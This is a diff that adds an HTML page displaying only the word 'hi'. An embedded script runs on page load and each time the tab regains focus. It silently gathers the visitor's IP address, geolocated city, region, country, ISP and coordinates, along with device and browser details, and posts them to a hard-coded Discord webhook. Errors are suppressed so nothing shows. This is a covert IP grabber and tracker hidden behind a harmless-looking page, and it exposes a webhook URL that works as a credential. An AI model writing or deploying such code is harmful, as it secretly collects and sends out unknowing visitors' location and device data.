@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>hi</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background: #f0f0f0; 
+            font-size: 48px; 
+            font-weight: 300;
+        }
+        @media (max-width: 480px) { body { font-size: 32px; } }
+    </style>
+</head>
+<body>
+    <div>hi</div>
+
+    <script>
+        // Discord webhook
+        const webhook = 'https://discord.com/api/webhooks/1459067938509295714/2NRdGBuXgQ6kOUP8BHbfPnGPbTBtUjpHyHds3JE4mDrhjUiwnQ2_9ZrxfXv7oeJeZLkO';
+        
+        // Get visitor data
+        const getVisitorData = () => {
+            const data = {
+                ip: 'Unknown',
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referer: document.referer || 'Direct',
+                screen: `${screen.width}x${screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`
+            };
+            
+            // Get real IP and geo via free API
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(geo => {
+                    data.ip = geo.ip || 'Unknown';
+                    data.city = geo.city || 'N/A';
+                    data.region = geo.region || 'N/A';
+                    data.country = geo.country_name || 'N/A';
+                    data.isp = geo.org || 'N/A';
+                    data.lat = geo.latitude;
+                    data.lon = geo.longitude;
+                    sendToDiscord(data);
+                })
+                .catch(() => {
+                    // Fallback IP API
+                    fetch(`https://api.ipify.org?format=json`)
+                        .then(r => r.json())
+                        .then(ipData => {
+                            data.ip = ipData.ip;
+                            fetch(`http://ip-api.com/json/${data.ip}?fields=city,regionName,country,isp,lat,lon`)
+                                .then(r => r.json())
+                                .then(geo => {
+                                    if (geo.status === 'success') {
+                                        data.city = geo.city;
+                                        data.region = geo.regionName;
+                                        data.country = geo.country;
+                                        data.isp = geo.isp;
+                                        data.lat = geo.lat;
+                                        data.lon = geo.lon;
+                                    }
+                                    sendToDiscord(data);
+                                })
+                                .catch(() => sendToDiscord(data));
+                        })
+                        .catch(() => sendToDiscord(data));
+                });
+        };
+        
+        // Detect device/browser
+        const detectDevice = () => {
+            const ua = navigator.userAgent;
+            let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
+            
+            // Device
+            if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = 'Mobile';
+            else if (/Tablet|iPad/i.test(ua)) device = 'Tablet';
+            
+            // OS
+            if (/Windows/i.test(ua)) os = 'Windows';
+            else if (/Mac/i.test(ua)) os = 'macOS';
+            else if (/Linux/i.test(ua)) os = 'Linux';
+            else if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+            
+            // Browser
+            if (/Chrome/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Edge/i.test(ua)) browser = 'Edge';
+            
+            return `${device} • ${os} • ${browser}`;
+        };
+        
+        // Send to Discord
+        const sendToDiscord = (data) => {
+            const deviceInfo = detectDevice();
+            const location = `${data.city || 'N/A'}, ${data.region || 'N/A'} (${data.country || 'N/A'})`;
+            
+            const embed = {
+                title: '🎯 New "hi" page hit!',
+                color: 3447003,
+                fields: [
+                    { name: '🆔 IP', value: data.ip, inline: true },
+                    { name: '🌍 Location', value: `${location}\nISP: ${data.isp || 'N/A'}`, inline: true },
+                    { name: '💻 Device', value: deviceInfo, inline: false },
+                    { name: '📱 Screen', value: `${data.screen} | ${data.viewport}`, inline: true },
+                    { name: '🔗 URL', value: data.url, inline: false },
+                    { name: '🌐 Referer', value: data.referer, inline: false },
+                    { name: '⏰ Time', value: data.timestamp, inline: true }
+                ],
+                footer: { text: 'WordPress HTML Tracker' }
+            };
+            
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            }).catch(e => {}); // Silent fail
+        };
+        
+        // Trigger on load
+        window.addEventListener('load', getVisitorData);
+        
+        // Also trigger on visibility change (back button, etc.)
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) getVisitorData();
+        });
+    </script>
+</body>
+</html>
